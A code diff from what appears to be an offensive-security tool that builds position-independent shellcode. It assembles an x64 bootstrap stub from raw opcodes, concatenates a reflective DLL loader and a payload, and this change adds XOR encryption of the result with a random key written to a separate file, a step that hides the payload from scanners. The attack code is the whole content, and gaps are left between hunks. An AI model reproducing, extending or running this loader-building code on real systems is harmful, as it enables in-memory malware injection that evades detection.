@@ -1,12 +1,6 @@
-#include <windows.h>
-#include <getopt.h>
-#include <iostream>
-#include <fstream>
-#include <vector>
-#include <cstdint>
-
 #include "generator.hpp"
 #include "../shared/crypto.hpp"
+#include "../shared/futils.hpp"
 
 int main(int argc, char **argv)
 {
@@ -68,26 +62,12 @@ int main(int argc, char **argv)
     std::cout << "[+] Payload path: " << payloadPath << std::endl;
     std::cout << "[+] Output path: " << outputPath << std::endl;
 
-    LPBYTE loaderContents;
-    DWORD loaderSize;
-
-    if (!GetFileContents(loaderPath, &loaderContents, &loaderSize))
-    {
-        return 1;
-    }
-
-    LPBYTE payloadContents;
-    DWORD payloadSize;
-
-    if (!GetFileContents(payloadPath, &payloadContents, &payloadSize))
-    {
-        return 1;
-    }
+    auto loaderContents = ReadFromFile(loaderPath);
+    auto payloadContents = ReadFromFile(payloadPath);
 
     // Compose the complete shellcode from loader, payload, and bootstrap
 
     std::vector<BYTE> bootstrap;
-    DWORD bootstrapSize = BOOTSTRAP_LEN;
     DWORD funcParameterHash = CalculateHash(funcParameter);
 
     /*
@@ -173,7 +153,7 @@ int main(int argc, char **argv)
     bootstrap.push_back(0x49);
     bootstrap.push_back(0x81);
     bootstrap.push_back(0xc0);
-    auto funcParameterOffset = (bootstrapSize - 5) + loaderSize + payloadSize;
+    auto funcParameterOffset = (BOOTSTRAP_LEN - 5) + loaderContents.size() + payloadContents.size();
 
     for (size_t i = 0; i < sizeof(funcParameterOffset); i++)
     {
@@ -192,7 +172,7 @@ int main(int argc, char **argv)
     bootstrap.push_back(0x48);
     bootstrap.push_back(0x81);
     bootstrap.push_back(0xc1);
-    auto payloadOffset = (bootstrapSize - 5) + loaderSize;
+    auto payloadOffset = (BOOTSTRAP_LEN - 5) + loaderContents.size();
 
     for (size_t i = 0; i < sizeof(payloadOffset); i++)
     {
@@ -205,7 +185,7 @@ int main(int argc, char **argv)
 
     // Call <reflectiveLoaderAddress> -> Call the reflective loader address
     bootstrap.push_back(0xe8);
-    auto reflectiveLoaderAddress = (bootstrapSize - 5) + loaderSize;
+    auto reflectiveLoaderAddress = (BOOTSTRAP_LEN - 5) + loaderContents.size();
 
     for (size_t i = 0; i < sizeof(reflectiveLoaderAddress); i++)
     {
@@ -235,15 +215,15 @@ int main(int argc, char **argv)
     bootstrap.push_back(0x90);
     bootstrap.push_back(0x90);
 
-    if (bootstrap.size() != bootstrapSize)
+    if (bootstrap.size() != BOOTSTRAP_LEN)
     {
-        std::cout << "[!] Bootstrap size mismatch: " << bootstrap.size() << " != " << bootstrapSize << std::endl;
+        std::cout << "[!] Bootstrap size mismatch: " << bootstrap.size() << " != " << BOOTSTRAP_LEN << std::endl;
         return 1;
     }
 
     std::cout << "[+] Bootstrap size: " << bootstrap.size() << std::endl;
-    std::cout << "[+] Loader size: " << loaderSize << std::endl;
-    std::cout << "[+] Payload size: " << payloadSize << std::endl;
+    std::cout << "[+] Loader size: " << loaderContents.size() << std::endl;
+    std::cout << "[+] Payload size: " << payloadContents.size() << std::endl;
 
     /*
         Form the complete shellcode with the following structure:
@@ -253,65 +233,24 @@ int main(int argc, char **argv)
             - User data
     */
 
-    bootstrap.insert(bootstrap.end(), loaderContents, loaderContents + loaderSize);
-    bootstrap.insert(bootstrap.end(), payloadContents, payloadContents + payloadSize);
+    bootstrap.insert(bootstrap.end(), loaderContents.begin(), loaderContents.end());
+    bootstrap.insert(bootstrap.end(), payloadContents.begin(), payloadContents.end());
 
-    std::cout << "[+] Total shellcode size: " << bootstrap.size() << std::endl;
+    // XOR with a random content length key
+    std::cout << "[+] XOR'ing the shellcode..." << std::endl;
+    auto key = GenerateKey(bootstrap.size());
+    XorCipher(bootstrap, key);
 
-    if (!WriteFileContents(outputPath, bootstrap.data(), bootstrap.size()))
-    {
-        return 1;
-    }
+    std::cout << "[+] Total XOR'd shellcode size: " << bootstrap.size() << std::endl;
 
-    auto srcUuid = GenerateUuid();
-    std::cout << "[+] AES key derivation UUID: " << srcUuid << std::endl;
+    WriteToFile(outputPath, bootstrap);
+    std::cout << "[+] Wrote the final shellcode to " << outputPath << std::endl;
 
-    std::cout << "[+]  " << std::endl;
+    auto keyPath = outputPath + ".key";
+    WriteToFile(keyPath, key);
+    std::cout << "[+] Wrote the XOR key to " << keyPath << std::endl;
 
     return 0;
-}
-
-BOOL GetFileContents(std::string filePath, LPBYTE *fileContents, DWORD *fileSize)
-{
-    std::ifstream infile(filePath, std::ios::binary | std::ios::ate);
-
-    if (!infile)
-    {
-        std::cout << "[!] Failed to open file for reading: " << filePath << std::endl;
-        return FALSE;
-    }
-
-    *fileSize = static_cast<DWORD>(infile.tellg());
-    infile.seekg(0, std::ios::beg);
-
-    *fileContents = new BYTE[*fileSize];
-    infile.read(reinterpret_cast<char *>(*fileContents), *fileSize);
-    infile.close();
-
-    return TRUE;
-}
-
-BOOL WriteFileContents(std::string filePath, LPBYTE fileContents, DWORD fileSize)
-{
-    std::ofstream outfile(filePath, std::ios::binary);
-
-    if (!outfile)
-    {
-        std::cout << "[!] Failed to open file for writing: " << filePath << std::endl;
-        return FALSE;
-    }
-
-    outfile.write(reinterpret_cast<char *>(fileContents), fileSize);
-
-    if (!outfile.good())
-    {
-        std::cout << "[!] Failed to write the contents: " << filePath << std::endl;
-        return FALSE;
-    }
-
-    outfile.close();
-
-    return TRUE;
 }
 
 void PrintHelp(char **argv)
